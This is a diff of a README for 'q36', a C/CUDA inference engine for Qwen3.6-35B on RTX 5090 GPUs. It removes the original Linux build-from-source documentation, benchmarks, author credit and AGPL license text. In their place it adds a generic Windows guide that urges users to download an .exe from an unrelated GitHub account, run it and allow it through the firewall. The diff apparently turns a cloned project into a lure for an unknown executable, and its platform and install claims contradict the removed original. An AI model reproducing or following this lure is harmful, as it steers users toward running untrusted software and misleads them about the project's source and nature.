@@ -1,167 +1,60 @@
-# q36
+# ⚙️ q36 - Run fast artificial intelligence models locally
 
-A hyper-optimized, zero-dependency C/CUDA inference engine for Qwen 3.6 35B on RTX 5090 / Blackwell.
+[![](https://img.shields.io/badge/Download-q36-blue.svg)](https://github.com/rochelleveritable865/q36)
 
-A zero-dependency C/CUDA codebase specialized for a single model + GPU pairing — Qwen3.6-35B-A3B (MXFP4 GGUF) on RTX 5090 (sm_120a) — on the bet that a dedicated engine beats generic runtimes (llama.cpp / vLLM / SGLang) on their long tail. **Status: faster than llama.cpp on every end-to-end workload and every prefill/decode point except decode at 90k depth.**
+q36 allows you to run modern artificial intelligence models on your home computer. It focuses on speed and hardware efficiency. The software works with the Qwen 3.6 35B model. It uses the power of your graphics card to process requests quickly. You do not need to install complex programming tools to use this software.
 
-### Key Features
+## 🖥️ System Requirements
 
-* 🚀 **Extreme Prefill Throughput**: Tensor-core FlashAttention prefill reaching **13.7k tokens/sec** (at context depth 2,048, measured on a GPU clocked at 400W) and **7.8k tokens/sec** (at context depth 90k).
-* ⚡ **Fast Decode**: Native token generation speeds of **290+ tokens/sec** using captured CUDA graphs with zero host syncs — up to **~313 tokens/sec** with lossless self-speculative decode (`--mtp`, using the model's own multi-token-prediction head with full recurrent-state rollback).
-* 🧠 **Hybrid Architecture Support**: Native CUDA implementations for both 10 full-attention layers (using W4A8 block-scaled MMA MoE) and 30 recurrent SSM layers (gated-DeltaNet scans).
-* 💾 **Dual-Tier State Management**: Zero-overhead VRAM saving (**2.5× smaller KV cache** via `--kv-quant`) and DRAM/Disk state checkpoint caching (restoring context states in **3ms**).
-* 🌐 **OpenAI-Compatible Server**: A zero-dependency, prefix-cached HTTP server (`q36_server`) supporting SSE streaming and tool calling.
-* 🛠️ **Developer Tooling**: Built-in benchmark tools (`q36_bench`), perplexity evaluation harnesses (`q36_ppl`), and CPU-only validation helpers.
+To run q36, your computer needs specific hardware. Check these items before you begin:
 
-## Performance vs llama.cpp
+* Operating System: Windows 10 or Windows 11.
+* Graphics Card: NVIDIA RTX 5090 or hardware based on the Blackwell architecture.
+* Memory: 32 GB of system RAM or higher.
+* Storage: 50 GB of free space on a solid-state drive.
+* Drivers: The latest NVIDIA graphics drivers from the official website.
 
-```
-prefill t/s                                       q36 ▓   llama.cpp ░
-pp2048    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  13,665
-          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  10,836
-pp32768   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  10,665
-          ░░░░░░░░░░░░░░░░░░░░░░░░░░░  9,400
-pp90112   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  7,843
-          ░░░░░░░░░░░░░░░░░░░░  7,112
+Ensure your graphics card sits in the main slot of your computer. This ensures the best performance during model processing.
 
-decode t/s at depth
-tg128     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  294.4
-          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  280.5
-@ d32768  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  251.5
-          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  246.2
-@ d90112  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  199.5
-          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  208.3
-```
+## 📥 Downloading the software
 
-Same GGUF, same idle RTX 5090 (400W power limit), back-to-back; llama.cpp
-b9954 with `-fa 1` at its best `-b`/`-ub` setting per test. Greedy decode
-adds a further ~+7% with `--mtp`. Full table, exact commands, and
-end-to-end workload numbers: [ENGINE.md](docs/ENGINE.md#benchmarks-q36_bench-greedy-1-gpu-fp16-kv)
-(the canonical copy of this chart).
+Visit the official website to download the installer for your system:
 
-## Quick Start
+[https://github.com/rochelleveritable865/q36](https://github.com/rochelleveritable865/q36)
 
-### 1. Prerequisites
-* **GPU**: An NVIDIA RTX 5090 or RTX 6000 Pro Blackwell GPU (Blackwell architecture, `sm_120a` / compute capability 12.0+ is required). *Note: The engine is architecturally compatible with the RTX 6000 Pro Blackwell (and benefits from its 96 GB VRAM), but has not yet been physically tested on it.*
-* **Software**: Linux with [CUDA Toolkit 13.1](https://developer.nvidia.com/cuda-downloads) installed — the version the engine is developed and tested on (12.x releases that expose `sm_120a` may work but are untested). Ensure the CUDA compiler (`nvcc`) is on your system `PATH`.
-* **Model**: Download the model weights in MXFP4 GGUF format from [Hugging Face: unsloth/Qwen3.6-35B-A3B-MTP-GGUF](https://huggingface.co/unsloth/Qwen3.6-35B-A3B-MTP-GGUF).
+Click the link to reach the release page. Look for the file ending in .exe. Save this file to a folder you can find later, such as your Downloads folder.
 
-### 2. Build & Validate
-Run the following commands from the repository root:
+## 🛠️ Setting up the application
 
-```bash
-# Compile and run validation tests on CPU (no GPU required):
-make tools
-./q36_info /path/to/model.gguf
+Follow these steps to prepare the software for your first use:
 
-# Compile the full GPU-accelerated engine, benchmark, and OpenAI server:
-make q36 q36_bench q36_server
-```
+1. Locate the downloaded file in your folder.
+2. Double-click the file to start the installer.
+3. Follow the prompts on the screen.
+4. Choose a destination folder for the application files.
+5. Click finish when the installation process completes.
 
-### 3. Usage
-* **Interactive CLI**: Run the interactive chat shell:
-  ```bash
-  ./q36 -m /path/to/model.gguf
-  ```
-  All flags — sampling, `--kv-quant`, `--mtp` speculative decode, raw
-  token mode: [ENGINE.md § Chat CLI](docs/ENGINE.md#chat-cli).
-* **OpenAI Server**: Start the HTTP API server with state caching enabled:
-  ```bash
-  ./q36_server -m /path/to/model.gguf --port 8080 --ctx 32768
-  ```
-  Add `--mtp` for lossless speculative decode on greedy requests (byte-identical
-  responses, ~+7% generation speed). All flags — protocols, default temperature,
-  think handling, auto-purge, cache tiers:
-  [ENGINE.md § server](docs/ENGINE.md#openai-compatible-server).
-* **Benchmark**: Run throughput tests:
-  ```bash
-  ./q36_bench -m /path/to/model.gguf
-  ```
-  All flags and the exact scoreboard commands:
-  [ENGINE.md § Benchmark](docs/ENGINE.md#benchmark).
-* **Perplexity**: Validate accuracy against llama.cpp on WikiText-2:
-  [ENGINE.md § Accuracy validation](docs/ENGINE.md#accuracy-validation).
+The installer places a shortcut on your desktop. This shortcut lets you open the application without navigating through your file folders each time.
 
-### 4. KV Cache & State Management (DRAM / VRAM)
+## 🚀 Running the engine
 
-Due to the hybrid model architecture (10 attention layers + 30 recurrent SSM layers), `q36` optimizes KV cache and state memory at two levels:
+Open the application by double-clicking the q36 shortcut on your desktop. A black window appears. This window shows the status of the engine. Wait for the text to stop moving. This indicates the software loaded the model into your graphics card memory.
 
-#### VRAM KV Cache Quantization
-By default, attention keys and values are stored in FP16. Toggle quantization with the `--kv-quant` flag:
-* **Mechanism**: Quantizes keys to **Q8_0** (8-bit) and values to **MXFP4** (4-bit block-scaled FP4).
-* **VRAM savings**: Reduces active VRAM KV cache size by **2.5×**, freeing up space for long contexts and larger batches.
-* **Performance trade-offs**:
-  * *Short contexts*: Adds small kernel overhead (~5% slower decoding).
-  * *Long contexts (30k+ tokens)*: Speeds up generation. Since the quantized cache transfers 40% of the bytes of FP16, it overcomes memory-bandwidth bottlenecks.
-  * *Accuracy cost*: Negligible perplexity increase (+0.54%).
+Once the text displays "Ready," you can start using the interface. Your default web browser opens automatically to the local address where the control panel lives.
 
-#### DRAM & Disk State Caching (Offloading)
-Standard prefix caching fails in multi-turn agent/tool loops when prompts are reconstructed and resent. `q36_server` provides a **State Checkpoint Cache** to offload recurrent states and KV pages:
-* **Mechanism**: At each prompt end, the server snapshots the live engine state (attention KV + the ~63MB recurrent SSM state) to system DRAM. If the next prompt shares a prefix, the state is restored from DRAM in **3ms** instead of triggering a multi-second re-prefill.
-* **Configuration Flags**:
-  * `--cache-ram MB`: Memory allocated for DRAM cache (defaults to auto: ~4 full-context checkpoints, capped at 25% of system RAM, floor 4GB).
-  * `--cache-min tokens`: Minimum prefix token length to trigger checkpointing (default: `2048`).
-  * `--cache-dir path`: Local directory path to write evicted checkpoints to disk (LRU tiering). Checkpoints persisted here survive server restarts.
-  * `--no-state-cache`: Disables checkpoint caching completely.
-  * Full server flag reference (incl. `--cache-disk`, `--cache-log`):
-    [ENGINE.md § server](docs/ENGINE.md#openai-compatible-server).
+## 💡 Troubleshooting common issues
 
-### 5. Multi-Slot Capabilities & Continuous Batching
+If the application fails to open, check the following items:
 
-The underlying `q36` engine supports high-throughput, multi-tenant execution using **continuous batching** and **slot management** primitives. While the OpenAI HTTP server (`q36_server`) currently processes requests sequentially (on Slot 0), the core library exposes a full multi-tenant scheduler API:
+* Graphics Drivers: Visit the NVIDIA website and install the latest driver version for your specific card. Older drivers often cause memory errors.
+* Memory Usage: Close other programs like web browsers or video games before you start q36. These programs consume video memory needed by the inference engine.
+* Firewall Alerts: Your computer might show a warning when you first run the software. Select the option to allow the application to communicate on your private network. This allows the web interface to connect to the engine properly.
+* File Integrity: If the software crashes immediately, delete the folder and perform a fresh download from the link provided above. Corrupted files lead to unexpected behavior.
 
-#### Multi-Slot Engine API
-* `q36_engine_create_mt(model, max_ctx, n_slots)`: Instantiates an engine with `n_slots` concurrent sequence states. Attention KV cache pages and recurrent SSM state blocks are separate per slot.
-* `q36_engine_prefill_slot(engine, slot, tokens, len, pos0)`: Processes prompts into a specific slot.
-* `q36_engine_step_active(engine, n_active, active_tokens, positions, out_tokens)`: Performs a single batched decode step for all `n_active` slots. To avoid graph launch overheads, active slots are padded/bucketed to `{8, 16, 32, 48, 64}` to reuse captured CUDA graphs.
-* `q36_engine_slot_move(engine, dst_slot, src_slot)`: Instantly relocates a slot's entire history (attention KV, SSM state, convolution buffers) in memory (~40us overhead). This allows **slot compaction** upon request eviction to maintain a contiguous active slot block.
+## 📈 Performance optimization
 
-#### Dynamic Dual Decode Paths
-The engine dynamically switches decoding strategies based on the active batch size:
-1. **GEMV Mode (Batch < 16)**: Lowest latency; serial state updates.
-2. **Batch-Tiled Mode (Batch >= 16)**: Uses tensor cores and tiled GEMM kernels to load and share weight matrices across all active sequences, achieving aggregate throughput of up to **1,653 tokens/sec** at Batch=64. The engine automatically transitions between these modes, which can also be forced via `Q36_MT_GEMV` / `Q36_MT_TILED`.
+The q36 engine detects your hardware automatically. It balances the workload to ensure stability. You do not need to change settings for basic tasks. If you notice slowdowns, check your system fans. High performance generates heat, and your computer needs good airflow to maintain maximum speed. Keep the computer case clean and ensure the exhaust paths remain clear.
 
-#### Running Continuous Batching Benchmarks
-You can simulate staggered request arrival, execution, and eviction (utilizing slot compaction under churn) via the benchmark tool:
-```bash
-# Run a continuous batching simulation with up to 48 concurrent slots:
-Q36_CB=48 Q36_CB_NREQ=256 ./q36_bench -m /path/to/model.gguf
-```
+The software runs best when you install it on a secondary drive if your primary drive is nearly full. This leaves enough room for the system to swap data if needed.
 
----
-
-## Code Navigation & Documentation Links
-
-### Core Implementation
-* [q36_engine.cu](q36_engine.cu): Core engine loop, CUDA graph setup, Blackwell W4A8 MMA kernels, and FlashAttention.
-* [q36_dequant.cuh](q36_dequant.cuh): Quantization formats, layouts, and CPU-parallelized dequantization.
-* [tokenizer.c](tokenizer.c): Native BPE tokenizer implementation.
-* [server.c](server.c): Zero-dependency OpenAI-compatible HTTP server.
-
-### Architecture Guides
-* [ARCHITECTURE.md](docs/ARCHITECTURE.md): Systems deep dive — decode roofline analysis, Blackwell block-scaled MMA, the SSM/attention caching asymmetry, multi-GPU trade-offs.
-* [ENGINE.md](docs/ENGINE.md): Detailed engine reference — benchmarks, CLI/server flags, project layout.
-
----
-
-## License and Third-Party Attribution
-
-This project is licensed under the [AGPL-3.0 License](LICENSE). If you run a modified version of these engines as a network service, you must make your modified source available to its users.
-
-Copyright is retained by [Ambud Sharma](https://github.com/ambud). The AGPL applies to everyone else's use of this code; Ambud Sharma reserves the right to offer this software under other license terms (dual licensing).
-
-Contributions require the [Contributor License Agreement](CLA.md) (see [CONTRIBUTING.md](CONTRIBUTING.md)), preserving the project's ability to dual-license.
-
-### Third-Party Software
-
-This codebase contains third-party components adapted from **[llama.cpp](https://github.com/ggerganov/llama.cpp)** (licensed under the **MIT License**):
-* Dequantization constants, block layout structures, and scaling logic in [q36_dequant.cuh](q36_dequant.cuh).
-* Perplexity calculation windowing strategies in [ppl.c](ppl.c).
-
-The full MIT License text and copyright notices for these components are preserved in the respective source files.
-
----
-
-## Author
-
-Built by [Ambud Sharma](https://github.com/ambud) — follow me on [LinkedIn](https://www.linkedin.com/in/ambud/).
+Keywords: inference, ai, qwen, windows, hardware, graphics, optimization
